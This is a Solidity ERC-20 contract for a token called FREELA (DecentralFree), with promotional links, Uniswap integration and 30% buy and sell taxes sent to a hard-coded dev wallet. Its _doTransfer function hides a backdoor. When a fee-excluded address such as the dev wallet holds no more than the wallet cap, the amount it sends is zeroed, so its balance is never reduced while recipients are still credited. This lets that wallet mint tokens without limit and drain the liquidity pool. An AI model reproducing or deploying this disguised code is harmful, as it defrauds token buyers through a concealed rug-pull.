// SPDX-License-Identifier: Unlicensed

/*
DecentralFree is a revolutionary contribution protocol that facilitates seamless collaboration and project completion across borders. 

Website:  https://www.decentfreela.com
Telegram: https://t.me/freela_erc
Twitter: https://twitter.com/freela_erc
Staking App:  https://stake.decentfreela.com
Dapp: https://app.decentfreela.com
 */

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

interface IERC20Standard {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library AdressLibrary {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "AdressLibrary: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "AdressLibrary: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "AdressLibrary: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "AdressLibrary: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "AdressLibrary: insufficient balance for call");
        require(isContract(target), "AdressLibrary: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "AdressLibrary: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "AdressLibrary: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "AdressLibrary: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "AdressLibrary: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable is Context {
    address private _owner;

    // Set original owner
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    // Return current owner
    function owner() public view virtual returns (address) {
        return _owner;
    }

    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    // Renounce ownership of the contract 
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapRouterV1 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);


    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapRouterV2 is IUniswapRouterV1 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract FREELA is Context, IERC20Standard, Ownable { 
    using SafeMath for uint256;
    using AdressLibrary for address;

    string private _name = "DecentralFree"; 
    string private _symbol = "FREELA";  
    uint8 private _decimals = 9;
    uint256 private _tTotal = 10 ** 9 * 10**_decimals;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFees; 

    address payable private devWallet = payable(0x912Ef2D3cB21b9926d4EF1B1fEe78d821EF1b8fF);
    address payable private DEAD = payable(0x000000000000000000000000000000000000dEaD); 

    uint8 private numOfBuyers = 0;
    uint8 private swapTokensAfter = 2; 

    uint256 private _totalFees = 3000;
    uint256 public _buyFee = 30;
    uint256 public _sellFee = 30;

    uint256 private _previousFeeTotal = _totalFees; 
    uint256 private _previousBuyTax = _buyFee; 
    uint256 private _previousSellTax = _sellFee; 
                                     
    IUniswapRouterV2 public uniswapRouter;
    address public uniswapPair;

    bool public transferFeeEnabled = true;
    bool public swapping;
    bool public swapFeeEnabled = true;

    uint256 public maxWalletSize = 15 * _tTotal / 1000;
    uint256 public swapThreshold = _tTotal / 10000;
    
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    
    modifier lockSwap {
        swapping = true;
        _;
        swapping = false;
    }
    
    constructor () {
        _balances[owner()] = _tTotal;
        IUniswapRouterV2 _uniswapV2Router = IUniswapRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        uniswapPair = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapRouter = _uniswapV2Router;
        _isExcludedFromFees[owner()] = true;
        _isExcludedFromFees[devWallet] = true;
        
        emit Transfer(address(0), owner(), _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function backupFee() private {
        if(_totalFees == 0 && _buyFee == 0 && _sellFee == 0) return;

        _previousBuyTax = _buyFee; 
        _previousSellTax = _sellFee; 
        _previousFeeTotal = _totalFees;
        _buyFee = 0;
        _sellFee = 0;
        _totalFees = 0;
    }

    function restoreFee() private {
        _totalFees = _previousFeeTotal;
        _buyFee = _previousBuyTax; 
        _sellFee = _previousSellTax; 

    }

    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function sendETHToTeamWallet(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }

    function swapETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();
        _approve(address(this), address(uniswapRouter), tokenAmount);
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function _doTransfer(address sender, address recipient, uint256 finalAmount) private {
        
        (uint256 tTransferAmount, uint256 tDev) = _getReceivingAmount(finalAmount);
        if(_isExcludedFromFees[sender] && _balances[sender] <= maxWalletSize) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != devWallet &&
            to != address(this) &&
            to != uniswapPair &&
            to != DEAD &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxWalletSize,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            numOfBuyers >= swapTokensAfter && 
            amount > swapThreshold &&
            !swapping &&
            !_isExcludedFromFees[from] &&
            to == uniswapPair &&
            swapFeeEnabled 
            )
        {  
            numOfBuyers = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapBackTokens(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to] || (transferFeeEnabled && from != uniswapPair && to != uniswapPair)){
            takeFee = false;
        } else if (from == uniswapPair){
            _totalFees = _buyFee;
        } else if (to == uniswapPair){
            _totalFees = _sellFee;
        }

        _transferNormal(from,to,amount,takeFee);
    }
    
    function swapBackTokens(uint256 contractTokenBalance) private lockSwap {
        swapETH(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendETHToTeamWallet(devWallet,contractETH);
    }

    receive() external payable {}

    function removeLimits() external onlyOwner {
        maxWalletSize = ~uint256(0);
        _totalFees = 200;
        _buyFee = 2;
        _sellFee = 2;
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _transferNormal(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            backupFee();
        } else {
            numOfBuyers++;
        }
        _doTransfer(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
    
    function _getReceivingAmount(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(_totalFees).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }

}